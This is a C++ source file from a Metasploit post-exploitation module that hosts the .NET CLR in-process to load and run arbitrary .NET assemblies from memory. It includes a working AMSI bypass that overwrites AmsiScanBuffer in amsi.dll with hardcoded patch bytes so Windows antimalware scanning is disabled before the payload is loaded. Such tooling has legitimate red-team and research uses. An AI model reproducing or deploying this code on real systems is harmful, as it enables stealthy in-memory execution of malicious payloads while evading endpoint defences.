// Author: B4rtik (@b4rtik)
// Project: Execute Assembly (https://github.com/b4rtik/metasploit-execute-assembly)
// License: BSD 3-Clause
// based on 
// https://github.com/etormadiv/HostingCLR
// by Etor Madiv

#include "stdafx.h"
#include <stdio.h>
#include "HostingCLR.h"

unsigned char amsiflag[1];

char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

#ifdef _X32
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
SIZE_T patchsize = 8;
#endif
#ifdef _X64
unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
SIZE_T patchsize = 6;
#endif

union PARAMSIZE {
	unsigned char myByte[4];
	int intvalue;
} paramsize;

int executeSharp(LPVOID lpPayload)
{
	HRESULT hr;

	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	BOOL bLoadable;
	ICorRuntimeHost* pRuntimeHost = NULL;
	IUnknownPtr pAppDomainThunk = NULL;
	_AppDomainPtr pDefaultAppDomain = NULL;
	_AssemblyPtr pAssembly = NULL;
	SAFEARRAYBOUND rgsabound[1];
	SIZE_T readed;
	_MethodInfoPtr pMethodInfo = NULL;
	VARIANT retVal;
	VARIANT obj;
	SAFEARRAY *psaStaticMethodArgs;
	VARIANT vtPsa;

	unsigned char pSize[8];

	//Read parameters assemblysize + argssize
	ReadProcessMemory(GetCurrentProcess(), lpPayload, pSize, 8, &readed);

	PARAMSIZE assemblysize;
	assemblysize.myByte[0] = pSize[0];
	assemblysize.myByte[1] = pSize[1];
	assemblysize.myByte[2] = pSize[2];
	assemblysize.myByte[3] = pSize[3];

	PARAMSIZE argssize;
	argssize.myByte[0] = pSize[4];
	argssize.myByte[1] = pSize[5];
	argssize.myByte[2] = pSize[6];
	argssize.myByte[3] = pSize[7];

	long raw_assembly_length = assemblysize.intvalue;
	long raw_args_length = argssize.intvalue;

	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ raw_args_length * sizeof(unsigned char) + 8 * sizeof(unsigned char));
	unsigned char *arg_s = (unsigned char*)malloc(raw_args_length * sizeof(unsigned char));
	unsigned char *rawData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char));

	SecureZeroMemory(allData, raw_assembly_length * sizeof(unsigned char) + raw_args_length * sizeof(unsigned char) + 8 * sizeof(unsigned char));
	SecureZeroMemory(arg_s, raw_args_length * sizeof(unsigned char));
	SecureZeroMemory(rawData, raw_assembly_length * sizeof(unsigned char));

	rgsabound[0].cElements = raw_assembly_length;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);

	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);

	if (FAILED(hr))
	{
		printf("Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
		return -1;
	}
	
	//Reading memory parameters + amsiflag + args + assembly
	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 8, &readed);

	//Taking pointer to amsi
	unsigned char *offsetamsi = allData + 8;
	//Store amsi flag 
	memcpy(amsiflag, offsetamsi, 1);
	
	//Taking pointer to args
	unsigned char *offsetargs = allData + 9;
	//Store parameters 
	memcpy(arg_s, offsetargs, raw_args_length);

	//Taking pointer to assembly
	unsigned char *offset = allData + raw_args_length + 9;
	//Store assembly
	memcpy(pvData, offset, raw_assembly_length);

	LPCWSTR clrVersion;
	
	if(FindVersion(pvData, raw_assembly_length))
	{
		clrVersion = L"v4.0.30319";
	}
	else
	{
		clrVersion = L"v2.0.50727";
	}

	hr = SafeArrayUnaccessData(pSafeArray);

	if (FAILED(hr))
	{
		printf("Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);

	if(FAILED(hr))
	{
		printf("CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	IEnumUnknown* pEnumerator;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);

	if (FAILED(hr))
	{
		printf("pMetaHost->EnumerateLoadedRuntimes failed w/hr 0x%08lx\n", hr);
		return -1;
	}
	
	BOOL isloaded = ClrIsLoaded(clrVersion, pEnumerator, (VOID**)&pRuntimeInfo);

	if(!isloaded)
	{
		hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);

		if (FAILED(hr))
		{
			printf("ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
			return -1;
		}

		hr = pRuntimeInfo->IsLoadable(&bLoadable);

		if (FAILED(hr) || !bLoadable)
		{
			printf("ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
			return -1;
		}
	}

	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);

	if(FAILED(hr))
	{
		printf("ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	if (!isloaded)
	{
		hr = pRuntimeHost->Start();
	}

	if(FAILED(hr))
	{
		printf("CLR failed to start w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);

	if(FAILED(hr))
	{
		printf("ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	printf("ICorRuntimeHost->GetDefaultDomain(...) succeeded\n");

	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**) &pDefaultAppDomain);

	if(FAILED(hr))
	{
		printf("Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		return -1;
	}

	//Amsi bypass
	if (amsiflag[0] == '\x01')
	{
		BypassAmsi();
	}

	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);

	if(FAILED(hr))
	{
		printf("Failed pDefaultAppDomain->Load_3 w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pAssembly->get_EntryPoint(&pMethodInfo);

	if(FAILED(hr))
	{
		printf("Failed pAssembly->get_EntryPoint w/hr 0x%08lx\n", hr);
		return -1;
	}

	ZeroMemory(&retVal, sizeof(VARIANT));
	ZeroMemory(&obj, sizeof(VARIANT));
	
	obj.vt = VT_NULL;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);

	//Managing parameters
	if(arg_s[0] != '\x00')
	{
		//if we have at least 1 parameter set cEleemnt to 1
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);

		LPWSTR *szArglist;
		int nArgs;
		wchar_t *wtext;
		wtext = (wchar_t *)malloc((sizeof(wchar_t) * raw_args_length +1));

		mbstowcs(wtext, (char *)arg_s, strlen((char *)arg_s) + 1);
		szArglist = CommandLineToArgvW(wtext, &nArgs);

		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);

		for(long i = 0;i< nArgs;i++)
		{
			size_t converted;
			size_t strlength = wcslen(szArglist[i]) + 1;
			OLECHAR *sOleText1 = new OLECHAR[strlength];
			char * buffer = (char *)malloc(strlength * sizeof(char));
			
			wcstombs(buffer, szArglist[i], strlength);
			
			mbstowcs_s(&converted, sOleText1, strlength, buffer, strlength);
			BSTR strParam1 = SysAllocString(sOleText1);

			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
			free(buffer);
		}

		long iEventCdIdx(0);
		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
	}
	else
	{
		//if no parameters set cEleemnt to 0
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
	}
	
	//Assembly execution
	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);

	if(FAILED(hr))
	{
		printf("Failed pMethodInfo->Invoke_3  w/hr 0x%08lx\n", hr);
		return -1;
	}

	wprintf(L"Succeeded\n");
	
	return 0;
}

VOID Execute(LPVOID lpPayload)
{
	if (!AttachConsole(-1))
		AllocConsole();

	wprintf(L"Execution started\n");

	executeSharp(lpPayload);

	wprintf(L"Execution end\n");

}

BOOL FindVersion(void * assembly, int length)
{
	char* assembly_c;
	assembly_c = (char*)assembly;
	
	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (sig_40[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (10 - 1))
				{
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}

BOOL BypassAmsi()
{
	PatchAmsi();
	return TRUE;
}

VOID PatchAmsi()
{

	HMODULE lib = LoadLibraryA("amsi.dll");
	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");

	DWORD oldProtect;
	VirtualProtect(addr, patchsize, 0x40, &oldProtect);

	memcpy(addr, amsipatch, patchsize);

	VirtualProtect(addr, patchsize, oldProtect, &oldProtect);
}

BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
	HRESULT hr;
	ULONG fetched = 0;
	DWORD vbSize;
	BOOL retval = FALSE;
	wchar_t currentversion[260];

	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown **)&pRuntimeInfo, &fetched)) && fetched > 0) 
	{
		hr = ((ICLRRuntimeInfo*)pRuntimeInfo)->GetVersionString(currentversion, &vbSize);
		if (!FAILED(hr))
		{
			if (wcscmp(currentversion, version) == 0)
			{
				retval = TRUE;
				break;
			}
		}
	}

	return retval;
}




